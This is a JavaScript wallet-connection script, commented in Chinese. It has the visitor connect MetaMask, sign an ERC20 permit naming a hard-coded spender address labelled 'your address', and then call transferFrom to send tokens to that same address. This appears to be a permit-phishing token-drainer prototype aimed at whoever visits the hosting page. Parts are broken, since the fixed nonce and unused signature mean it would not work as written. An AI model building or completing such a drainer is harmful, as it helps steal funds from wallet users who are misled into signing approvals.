window.addEventListener('load', () => {
    const connectWalletBtn = document.getElementById("connectWallet");
    const signPermitBtn = document.getElementById("signPermit");
    const transferTokensBtn = document.getElementById("transferTokens");
    const statusParagraph = document.getElementById("status");

    let userAccount;
    let provider;
    let signer;
    const contractAddress = "0x2E9d30761DB97706C536A112B9466433032b28e3";  // 最新合约地址
    const contractABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "deadline",
				"type": "uint256"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "permit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

    // 连接钱包
    connectWalletBtn.addEventListener("click", async () => {
        try {
            if (window.ethereum) {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAccount = await signer.getAddress();
                statusParagraph.innerText = `钱包已连接: ${userAccount}`;
            } else {
                statusParagraph.innerText = "请安装 MetaMask 或其他以太坊钱包扩展。";
            }
        } catch (error) {
            console.error("连接钱包失败", error);
            statusParagraph.innerText = "连接钱包失败，请重试。";
        }
    });

    // 签名授权
    signPermitBtn.addEventListener("click", async () => {
        try {
            const contract = new ethers.Contract(contractAddress, contractABI, signer);
            const deadline = Math.floor(Date.now() / 1000) + 60 * 60;  // 1小时过期
            const value = ethers.utils.parseUnits("1.0", 18);  // 签名的代币数量
            const owner = userAccount;
            const spender = "0xa465e2fc9f9d527AAEb07579E821D461F700e699";  // 你的地址

            // 获取链上的签名数据（v, r, s）
            const signature = await signer._signTypedData(
                {
                    name: "ERC20Permit",
                    version: "1",
                    chainId: 1,
                    verifyingContract: contractAddress,
                },
                {
                    Permit: [
                        { name: "owner", type: "address" },
                        { name: "spender", type: "address" },
                        { name: "value", type: "uint256" },
                        { name: "nonce", type: "uint256" },
                        { name: "deadline", type: "uint256" }
                    ]
                },
                { owner, spender, value, nonce: 0, deadline }
            );
            console.log("签名成功", signature);
            statusParagraph.innerText = "签名成功，准备转移代币。";
        } catch (error) {
            console.error("签名授权失败", error);
            statusParagraph.innerText = "签名授权失败，请重试。";
        }
    });

    // 代币转移
    transferTokensBtn.addEventListener("click", async () => {
        try {
            const contract = new ethers.Contract(contractAddress, contractABI, signer);
            const recipient = "0xa465e2fc9f9d527AAEb07579E821D461F700e699";  // 接收者地址
            const amount = ethers.utils.parseUnits("1.0", 18);  // 转移的代币数量

            const tx = await contract.transferFrom(userAccount, recipient, amount);
            await tx.wait();
            statusParagraph.innerText = `代币转移成功，已转移 ${amount.toString()} 到 ${recipient}`;
        } catch (error) {
            console.error("代币转移失败", error);
            statusParagraph.innerText = "代币转移失败，请重试。";
        }
    });
});
